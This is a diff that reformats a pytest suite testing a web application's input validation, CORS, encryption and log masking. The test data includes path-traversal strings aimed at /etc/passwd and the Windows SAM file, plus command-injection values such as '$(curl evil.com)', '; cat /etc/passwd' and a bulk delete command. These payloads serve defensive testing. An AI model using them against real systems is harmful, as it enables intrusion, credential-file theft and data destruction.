@@ -5,13 +5,13 @@ This module tests input validation and security measures implemented
 across the application endpoints.
 """
 
-import pytest
 import json
-from unittest.mock import MagicMock, patch
+from unittest.mock import patch
+
+import pytest
 from fastapi.testclient import TestClient
-from fastapi import HTTPException
+
 from resync.main import app
-from tests.conftest import security_test_data
 
 
 class TestInputValidation:
@@ -59,7 +59,7 @@ class TestInputValidation:
             "../../../etc/passwd",
             "..\\..\\..\\windows\\system32\\config",
             "/etc/passwd",
-            "C:\\windows\\system32\\config\\sam"
+            "C:\\windows\\system32\\config\\sam",
         ]
 
         for payload in traversal_payloads:
@@ -75,7 +75,7 @@ class TestInputValidation:
             "del C:\\*.* /Q",
             "$(curl evil.com)",
             "`whoami`",
-            "; cat /etc/passwd"
+            "; cat /etc/passwd",
         ]
 
         for payload in command_payloads:
@@ -117,12 +117,15 @@ class TestInputValidation:
             "{{'nested': 'value'}",  # Mismatched braces
             "{'key': 'unclosed value}",
             "null",
-            "undefined"
+            "undefined",
         ]
 
         for payload in invalid_json_payloads:
-            response = self.client.post("/api/review", data=payload,
-                                      headers={"Content-Type": "application/json"})
+            response = self.client.post(
+                "/api/review",
+                data=payload,
+                headers={"Content-Type": "application/json"},
+            )
             # Should handle invalid JSON gracefully
             assert response.status_code == 422
 
@@ -134,8 +137,8 @@ class TestInputValidation:
             {"content": "测试中文"},
             {"content": "тест на русском"},
             {"content": "🌍 International"},
-            {"content": "\u0000\u001F\u007F"},  # Control characters
-            {"content": "\u200B\u200C\u200D"},  # Zero-width characters
+            {"content": "\u0000\u001f\u007f"},  # Control characters
+            {"content": "\u200b\u200c\u200d"},  # Zero-width characters
         ]
 
         for payload in unicode_payloads:
@@ -160,7 +163,7 @@ class TestInputValidation:
         cors_headers = {
             "Origin": "http://malicious-site.com",
             "Access-Control-Request-Method": "POST",
-            "Access-Control-Request-Headers": "X-Custom-Header"
+            "Access-Control-Request-Headers": "X-Custom-Header",
         }
 
         response = self.client.options("/review", headers=cors_headers)
@@ -171,8 +174,11 @@ class TestInputValidation:
     def test_content_type_validation(self):
         """Test content type validation."""
         # Test with wrong content type
-        response = self.client.post("/api/review", data="not json",
-                                  headers={"Content-Type": "text/plain"})
+        response = self.client.post(
+            "/api/review",
+            data="not json",
+            headers={"Content-Type": "text/plain"},
+        )
         assert response.status_code == 422
 
         # Test with no content type
@@ -237,7 +243,7 @@ class TestEncryptionSecurity:
         from resync.core.encryption_service import EncryptionService
 
         # Mock the encryption service
-        with patch.object(EncryptionService, 'encrypt') as mock_encrypt:
+        with patch.object(EncryptionService, "encrypt") as mock_encrypt:
             mock_encrypt.return_value = "encrypted_test"
 
             # POST to sensitive endpoint which uses encryption
@@ -250,9 +256,11 @@ class TestEncryptionSecurity:
     def test_data_masking_in_logs(self):
         """Test that sensitive data is masked in logs."""
         # Mock the underlying logger.info to capture masked log output
-        with patch('resync.core.logger.logger.info') as mock_log:
+        with patch("resync.core.logger.logger.info") as mock_log:
             # POST to sensitive endpoint which logs the data
-            response = self.client.post("/api/sensitive", json={"data": "password=secret123"})
+            response = self.client.post(
+                "/api/sensitive", json={"data": "password=secret123"}
+            )
             assert response.status_code == 200
 
             # Verify that sensitive data is masked in logs
